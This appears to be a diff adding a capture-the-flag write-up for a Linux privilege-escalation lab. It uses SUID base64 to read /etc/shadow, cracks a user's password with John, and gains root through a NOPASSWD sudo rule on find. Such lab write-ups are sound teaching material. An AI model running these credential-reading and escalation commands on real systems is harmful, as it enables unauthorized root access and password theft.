@@ -177,3 +177,63 @@ You should now be root. Head over to /home/matt/ for the flag.
 
 
 
+Task 12 {Capstone Challenge}
+
+Question 1: What is the content of the flag1.txt file?
+
+Always {{Emumerate}}
+
+I began by pulling some information about the machine:
+Kernel:
+"uname -a"
+Linux ip-10-10-39-61 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+Which Linux:
+"cat /etc/issue"
+\S
+Kernel \r on an \m
+
+Which Python:
+"python --version"
+Python 2.7.5
+
+Next, I checked sudo permissions
+
+"sudo -l" ... which turned up nothing
+
+What about files with SUID set?
+"find / -type f -perm -04000 -ls 2>/dev/null"
+Looking through the list, we see base64.
+By manipulating this, we can see the contents of the /etc/shadow file:
+LFILE="/etc/shadow"
+base64 "/etc/shadow" | base64 --decode
+
+Save this to a file, and save the contents of /etc/passwd to another
+"cat /etc/passwd"
+
+On your system, unshadow the file:
+"unshadow passwd.txt shadow.txt > unshadow.txt"
+
+Then, use John to crack the password for Missy:
+"john unshadow.txt"
+(You don't have to specify any additional arguments for john)
+
+Login as missy:
+su missy
+(enter password)
+
+Head over to /home/missy/Documents/ to get flag1.txt
+
+Question 2: What is the content of the flag2.txt file?
+
+{{Privilege Escalation}}
+
+Once logged in as missy, I checked the sudo permissions
+"sudo -l"
+And came across (ALL) NOPASSWD: /usr/bin/find
+
+I looked up find on gtfobins, and it turns out we can exploit it.
+
+"sudo find . -exec /bin/sh \; -quit"
+
+Try "whoami" and see that you are root :)
